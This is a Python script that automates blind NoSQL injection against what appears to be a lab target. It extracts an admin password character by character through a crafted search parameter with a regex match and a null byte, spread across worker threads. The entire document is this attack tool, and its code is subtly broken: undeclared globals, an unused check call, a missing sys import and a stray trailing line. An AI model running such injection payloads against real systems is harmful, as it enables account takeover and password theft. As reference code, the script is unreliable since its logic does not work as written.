import urllib.request
import string
import queue
from threading import Thread

q = queue.Queue()  # initialise queue
concurrent = 2  # set max number of threads, increase for more but you monitor bandwidth.
URL = "http://ptl-d474fee0-1ad84ec0.libcurl.st/"
CHARSET=list("-"+string.ascii_lowercase+string.digits)
password=""


def do_work():
    while True:
        checkinchar = q.get()
        check(checkinchar)
        test = password + c  # in memory tracking where we are
        if check("^" + test + ".*$"):  # looking at the current test
            password += c  # if it is true, we add it to the password
            print("char! " + password)  # print the char found for password
            break  # move to next char
        elif c == CHARSET[-1]:  # look for entire charset exhausted or that we have full password
            print("[*] FOUND: " + password)
            exit(0)
        q.task_done()

def check(payload):
    url = URL + "/?search=admin%27%26%26this.password.match(/" + payload + "/)%00"
    print("URL is " + url)  # sanity check print
    resp = urllib.request.urlopen(url)  # stores the response
    data = resp.read()  # read the response into data
    return ">admin<" in str(data)  # Reads for the key admin in the,
    # data var CHANGE DATA HERE for field in response for success/fail

for i in range(concurrent):
    t = Thread(target=do_work)
    t.daemon = True
    t.start()
try:
    for c in CHARSET:  # The characters we feed into the checking
        q.put(c)
    q.join()
    print("")
except KeyboardInterrupt:
    sys.exit(1)
test = password+c
